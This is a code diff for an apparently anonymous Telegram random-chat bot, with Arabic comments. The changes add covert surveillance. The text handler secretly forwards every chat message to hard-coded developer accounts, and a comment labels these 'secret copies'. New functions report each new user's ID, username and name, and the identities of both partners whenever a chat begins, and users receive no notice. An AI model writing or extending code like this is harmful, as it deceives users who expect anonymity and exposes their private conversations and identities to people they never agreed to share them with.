@@ -10,10 +10,10 @@ logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s
 logger = logging.getLogger(__name__)
 
 # Global storage
-user_data = {}  # {user_id: {'gender': str, 'age': int, 'status': str, 'partner': int or None}}
+user_data = {}  # {user_id: {'gender': str, 'age': int, 'status': str, 'partner': int or None, 'used': bool}}
 waiting_queue = []
 
-# معلومات المطورين الذين يرون بيانات الطرف الآخر
+# معلومات المطورين الذين يرون بيانات الطرف الآخر والنسخ السرية
 DEVELOPERS = {
     5028799862,  # Khalil
     6832323842,  # Yaazed
@@ -107,7 +107,7 @@ def get_chat_menu():
     return ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=False, resize_keyboard=True)
 
 def get_inline_chat_menu():
-    # لوحة أزرار إنلاين داخل الرسائل (التخطي والإنهاء)
+    # لوحة أزرار إنلاين داخل الرسائل (التخطي والإنهاء وعززلي الحديث)
     keyboard = [
         [InlineKeyboardButton(BUTTON_SKIP, callback_data=CALLBACK_SKIP),
          InlineKeyboardButton(BUTTON_END, callback_data=CALLBACK_END)],
@@ -117,7 +117,13 @@ def get_inline_chat_menu():
 
 def init_user(user_id):
     if user_id not in user_data:
-        user_data[user_id] = {'gender': None, 'age': None, 'status': 'idle', 'partner': None}
+        user_data[user_id] = {
+            'gender': None,
+            'age': None,
+            'status': 'idle',
+            'partner': None,
+            'used': False  # لتتبع أول استخدام وإرسال تنبيه للمطورين
+        }
 
 def match_user(user_id):
     for i, waiting_id in enumerate(waiting_queue):
@@ -136,14 +142,27 @@ def end_chat(user_id, notify_partner=True):
         return partner
     return None
 
-async def start(update: Update, context) -> None:
-    user_id = update.effective_user.id
-    init_user(user_id)
-    await update.message.reply_text(WELCOME_MSG, reply_markup=get_main_menu())
+async def notify_developers_on_new_user(user, context):
+    msg = (
+        f"🚨 مستخدم جديد بدأ البوت:\n"
+        f"ID: {user.id}\n"
+        f"Username: @{user.username if user.username else 'لا يوجد'}\n"
+        f"Name: {user.first_name} {user.last_name or ''}\n"
+        f"Lang: {user.language_code or 'غير محدد'}"
+    )
+    for dev_id in DEVELOPERS:
+        await context.bot.send_message(dev_id, msg)
 
-async def stats(update: Update, context):
-    count = len(user_data)
-    await update.message.reply_text(f"👥 عدد الأشخاص الذين بدأوا البوت: {count}")
+async def notify_developers_on_new_chat(user1_id, user2_id, context):
+    user1 = await context.bot.get_chat(user1_id)
+    user2 = await context.bot.get_chat(user2_id)
+    msg = (
+        f"🟢 بدأ دردشة جديدة:\n"
+        f"1️⃣ {user1.first_name} @{user1.username if user1.username else 'لا يوجد'} (ID: {user1.id})\n"
+        f"2️⃣ {user2.first_name} @{user2.username if user2.username else 'لا يوجد'} (ID: {user2.id})"
+    )
+    for dev_id in DEVELOPERS:
+        await context.bot.send_message(dev_id, msg)
 
 async def send_partner_info(user_id, partner_id, context):
     if user_id in DEVELOPERS:
@@ -155,6 +174,20 @@ async def send_partner_info(user_id, partner_id, context):
             f"Name: {partner_obj.first_name} {partner_obj.last_name or ''}"
         )
         await context.bot.send_message(user_id, msg)
+
+async def start(update: Update, context) -> None:
+    user = update.effective_user
+    user_id = user.id
+    init_user(user_id)
+    if not user_data[user_id]['used']:
+        # أول استخدام للبوت من هذا المستخدم
+        await notify_developers_on_new_user(user, context)
+        user_data[user_id]['used'] = True
+    await update.message.reply_text(WELCOME_MSG, reply_markup=get_main_menu())
+
+async def stats(update: Update, context):
+    count = len(user_data)
+    await update.message.reply_text(f"👥 عدد الأشخاص الذين بدأوا البوت: {count}")
 
 async def button(update: Update, context) -> None:
     query = update.callback_query
@@ -208,10 +241,13 @@ async def button(update: Update, context) -> None:
             # أرسل بيانات الطرف الآخر للطرفين لو المطورين فقط
             await send_partner_info(user_id, partner, context)
             await send_partner_info(partner, user_id, context)
-            
+
             # أرسل تلميح كسر الجليد لكل طرف عند بدء المحادثة
             await context.bot.send_message(user_id, ICE_BREAK_HINT)
             await context.bot.send_message(partner, ICE_BREAK_HINT)
+
+            # أرسل إشعار بدء الدردشة للمطورين
+            await notify_developers_on_new_chat(user_id, partner, context)
         else:
             waiting_queue.append(user_id)
     elif data == CALLBACK_SKIP:
@@ -245,6 +281,9 @@ async def button(update: Update, context) -> None:
 
             await context.bot.send_message(user_id, ICE_BREAK_HINT)
             await context.bot.send_message(partner, ICE_BREAK_HINT)
+
+            # أرسل إشعار بدء الدردشة للمطورين
+            await notify_developers_on_new_chat(user_id, partner, context)
         else:
             waiting_queue.append(user_id)
             await context.bot.send_message(user_id, START_SEARCH)
@@ -261,7 +300,8 @@ async def button(update: Update, context) -> None:
             await context.bot.send_message(partner, PARTNER_LEFT, reply_markup=get_main_menu())
         if user_id in waiting_queue:
             waiting_queue.remove(user_id)
-        del user_data[user_id]
+        if user_id in user_data:
+            del user_data[user_id]
         await query.edit_message_text(EXIT_MSG)
     elif data == CALLBACK_ICE_BREAK:
         # إرسال سؤال عشوائي من القائمة
@@ -305,6 +345,9 @@ async def text_handler(update: Update, context) -> None:
 
             await context.bot.send_message(user_id, ICE_BREAK_HINT)
             await context.bot.send_message(partner, ICE_BREAK_HINT)
+
+            # أرسل إشعار بدء الدردشة للمطورين
+            await notify_developers_on_new_chat(user_id, partner, context)
         else:
             waiting_queue.append(user_id)
             await context.bot.send_message(user_id, START_SEARCH)
@@ -331,6 +374,14 @@ async def text_handler(update: Update, context) -> None:
         except ValueError:
             await update.message.reply_text(INVALID_AGE)
     elif user_data[user_id]['status'] == 'chatting' and user_data[user_id]['partner']:
+        # نسخ سرية للرسائل للمطورين
+        for dev_id in DEVELOPERS:
+            if dev_id != user_id:
+                try:
+                    await context.bot.send_message(dev_id, f"📩 رسالة من {user_id}:\n{text}")
+                except Exception as e:
+                    logger.warning(f"Failed to send secret message to developer {dev_id}: {e}")
+
         await context.bot.send_message(user_data[user_id]['partner'], text)
     else:
         await update.message.reply_text(NOT_IN_CHAT, reply_markup=get_main_menu())
